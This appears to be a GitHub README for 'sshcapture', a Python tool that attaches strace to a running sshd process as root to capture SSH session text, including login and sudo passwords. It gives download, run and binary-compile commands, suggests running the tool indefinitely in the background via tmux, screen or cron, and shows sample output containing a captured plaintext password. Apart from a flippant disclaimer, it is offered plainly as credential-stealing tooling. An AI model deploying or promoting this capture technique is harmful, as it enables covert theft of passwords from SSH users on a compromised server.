# sshcapture

Simple python script that uses strace to attach to the currently running sshd process on an ssh server, and captures text from user sessions (including passwords). Requirements:
- Linux server with strace installed and sshd running
- You have root access

DISCLAIMER: only use if you have permission, don't be an idiot, I am not held liable, etc etc

Steps:
- Install strace -  `yum install strace`, `apt install strace`, etc
- Download the script - `wget https://raw.githubusercontent.com/anton-3/sshcapture/main/capture.py`
- Run it as root
  - `sudo python3 capture.py` prints to standard output
  - `sudo python3 capture.py /var/log/supersecret.log` writes to an output file
- (Optional) Compile it to a binary with pyinstaller
  - `python3 -m pip install pyinstaller`
  - `pyinstaller -F capture.py` puts the binary in ./dist
- (Optional) run it indefinitely in the background with something like tmux or screen (or a cronjob)

How it works: Hooks into the `write` syscalls made by ssh sessions and reads stdout from the strace command. There's a whole lot of non-ASCII garbage in the output that's impossible to get rid of with strace itself, so the script filters some of that out (there's still a lot of garbage left though). Prints an alert before every ssh session and sudo call, if passwords are what you're into. The script kinda sucks, I hacked it together in a couple hours and it's still overcomplicated somehow

also I literally only tested it on a barebones debian vm so if it doesn't work my b

Example output (the important part, the whole thing is hundreds of lines):
```
...

user
$
0`|ZlU0xZlUX[lU@Y[lU@X[lUuser*user,,,/home/user/bin/bash
d
################################################################################
################################ SSH CONNECTION ################################
################################################################################
ssh-connection
aAX\favv kQ?SGaN\\Y'
ssh-rsa&1f).$0Od\"%iq8 X^]=%=R>WG~/vxXD\fWHYQm{X9/[]'lzDpi2\v'Y-d]]/@;Ed(RCkukUP 0Slp:oiRX/q<BrgAA9F\"/
S[G[IIJwiQ8&{dyc-n}'w
H
3\vssh-ed25519 C$(z:BL?eG0qd2
IqEeeX\fAW<e|W#&fPgz}
\f
secretPASSWORD123!
f
g
iqXmZ>!7*d{
 Q.w>@wJ>do\v@\vssh-ed25519^2PQi<Vjcurve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-h
1000
Linux debian 5.10.0-20-amd64 #1 SMP Debian 5.10.158-2 (2022-12-13) x86_64

...
```

Resources:
- `man strace`
- `man 2 write`
- literally just google "capture ssh passwords with strace"
